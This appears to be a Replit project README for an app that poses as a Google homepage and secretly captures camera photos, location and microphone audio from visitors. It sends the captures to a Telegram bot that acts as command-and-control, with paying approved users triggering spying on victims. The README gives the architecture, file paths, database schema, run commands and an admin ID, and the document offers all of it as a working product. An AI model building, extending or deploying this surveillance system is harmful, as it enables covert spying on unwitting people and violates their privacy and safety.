# Facebook Marketplace — Replit Project

## Overview

A covert surveillance app disguised as a Google search page. The camera-app frontend looks like a Google homepage but silently captures photos (front/rear camera), location, and audio, sending everything to a Telegram bot. A Telegram bot acts as the command-and-control interface, and the Express API server handles uploads and database operations.

## Architecture

- **Monorepo** managed with `pnpm` workspaces
- **Frontend** (`artifacts/camera-app`): React + Vite + Tailwind app on port 5000
- **Backend** (`artifacts/api-server`): Express 5 API server on port 8000
- **Database** (`lib/db`): Drizzle ORM with PostgreSQL
- **API spec** (`lib/api-spec`): OpenAPI 3.1 + Orval codegen
- **Generated client** (`lib/api-client-react`): React Query hooks
- **Generated Zod schemas** (`lib/api-zod`): Request/response validation

## Key Files

- `artifacts/camera-app/src/App.tsx` — Main covert camera app UI
- `artifacts/camera-app/vite.config.ts` — Vite config (proxies `/api` → localhost:8000)
- `artifacts/api-server/src/app.ts` — Express app setup
- `artifacts/api-server/src/routes/upload.ts` — Photo/location/audio upload routes
- `artifacts/api-server/src/lib/telegram-bot.ts` — Telegram bot polling & command handling
- `artifacts/api-server/src/lib/db.ts` — PostgreSQL helper functions
- `lib/db/src/schema/index.ts` — Drizzle schema definitions

## Database Tables

- `bot_users` — Telegram users with approval status and points
- `point_costs` — Cost per action (front/rear/location/mic/all)
- `bot_settings` — Key-value settings store

## Environment Variables

- `DATABASE_URL` — PostgreSQL connection string (auto-provisioned by Replit)
- `PORT` — Port for each service (5000 frontend, 8000 backend)
- `BASE_PATH` — Base path for the Vite frontend (set to `/`)
- `REPLIT_DOMAINS` — Used by the bot to build app URLs

## Workflows

- **Start application** — Frontend (port 5000): `PORT=5000 BASE_PATH=/ pnpm --filter @workspace/camera-app run dev`
- **API Server** — Backend (port 8000): `PORT=8000 pnpm --filter @workspace/api-server run dev`

## Development Commands

```bash
# Install all packages
pnpm install

# Run frontend only
PORT=5000 BASE_PATH=/ pnpm --filter @workspace/camera-app run dev

# Run backend only
PORT=8000 pnpm --filter @workspace/api-server run dev

# Run DB schema push
pnpm --filter @workspace/db run push

# Run codegen (regenerate API client from OpenAPI spec)
pnpm --filter @workspace/api-spec run codegen
```

## Telegram Bot

The Telegram bot token is hardcoded in `artifacts/api-server/src/lib/telegram-bot.ts`.
The `ADMIN_ID` (1064122583) is the only admin who can approve users and manage the system.
The bot uses long-polling to receive commands and SSE to push commands to connected browser clients.
